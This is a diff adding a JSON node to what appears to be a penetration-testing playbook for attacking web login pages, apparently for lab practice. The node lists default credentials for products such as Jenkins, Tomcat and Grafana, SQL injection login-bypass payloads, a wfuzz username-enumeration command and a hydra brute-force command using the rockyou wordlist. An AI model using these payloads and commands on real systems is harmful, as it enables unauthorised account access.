@@ -1,0 +1,26 @@
+{
+  "id": "login_page",
+  "phase": "WEB",
+  "title": "Login Page",
+  "body": "Test default creds first (5 minutes). Then SQLi bypass. Then brute force. Username enumeration via response differences is gold.",
+  "cmd": "# Default creds to try first\nadmin:admin  admin:password  admin:admin123\nroot:root    guest:guest     test:test\n# Management consoles — try these too:\n# HP Power Manager: admin:admin (lab validated: Kevin)\n# Grafana:          admin:admin\n# Jenkins:          admin:password  or no password\n# Tomcat manager:   tomcat:tomcat  admin:admin\n# SNMP:             community string = public\n# Always try default BEFORE running any exploit\n\n# SQLi bypass\n' OR 1=1--\nadmin'--\n' OR '1'='1'--\n\n# Username enumeration — look for different response length/time\nwfuzz -c -z file,/opt/SecLists/Fuzzing/USERNAMES/usernames.txt \\\n  --hc 404,403 \"http://$ip/users/FUZZ\"\n\n# Brute force with hydra\nhydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n  http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid\" -V",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Got access",
+      "next": "file_upload"
+    },
+    {
+      "label": "SQLi bypass worked",
+      "next": "sqli_test"
+    },
+    {
+      "label": "Brute force the login",
+      "next": "bruteforce"
+    },
+    {
+      "label": "Need usernames first",
+      "next": "web_fuzz_deep"
+    }
+  ]
+}
